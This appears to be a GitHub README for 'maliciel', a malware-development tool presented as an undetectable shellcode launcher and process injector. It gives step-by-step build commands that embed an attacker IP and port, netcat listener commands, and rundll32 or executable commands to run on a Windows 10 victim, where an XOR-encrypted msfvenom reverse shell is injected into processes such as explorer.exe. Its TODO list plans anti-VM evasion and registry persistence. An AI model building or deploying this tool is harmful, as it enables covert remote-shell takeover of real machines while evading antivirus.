# maliciel

Simple undetectable shellcode and code injector launcher example. Inspired by RTO malware development course.

## Main logic

XOR encryption and decryption for functions call and main payload - `msfvenom` reverse shell as example.

## Usage
## 1. DLL
### on attacker machine

check your IP:
```bash
ip a
```

![attacker machine IP](./screenshots/ip_a.png?raw=true)

run python script with flags:
```bash
python3 maliciel.py -l 10.241.7.33 -p 443 --build 1
```

![run python script](./screenshots/maliciel_dll_build.png?raw=true)

run netcat listener:
```bash
nc -lnvp 443
```

### then on victim machine (windows 10 x64):
run on powershell or cmd promt:
```cmd
rundll32 .\maliciel.dll, lnDspRKOhUnSxNJnPQlS
```

## 2.Injector
### on attacker machine:
check attacker ip:
```bash
ip a
```

![check IP](./screenshots/ip_a.png?raw=true)

run python script on linux (for example process `explorer.exe`):
```bash
python3 maliciel.py -l 10.241.7.33 -p 443 -e explorer.exe --build 2
```

![run python script](./screenshots/maliciel_pe_build.png?raw=true)

run netcat listener:
```bash
nc -lnvp 443
```

### then on victim machine run (windows 10 x64):
```cmd
.\maliciel.exe
```

or click (if `-m windows` param)

## 3. NT API injector
run python script on linux (for example process `mspaint.exe`):
```bash
python3 maliciel.py -l 10.241.7.33 -p 443 -e explorer.exe -m console --build 3
```

![enc and compile nt](./screenshots/maliciel_nt_build.png?raw=true)

run netcat listener:
```bash
nc -lnvp 443
```

### then on victim machine (windows 10 x64):
```cmd
.\maliciel.exe
```

## TODO
- [x] Compile injector in Kali linux
- [x] XOR + AES (other folder)
- [x] Calling Windows API functions by hash names
- [x] Find Kernel32 base via asm style
- [x] One python builder
- [ ] Anti-VM tricks
- [ ] Persistence via Windows Registry run keys
- [ ] Replace msfvenom shell to donut payload???
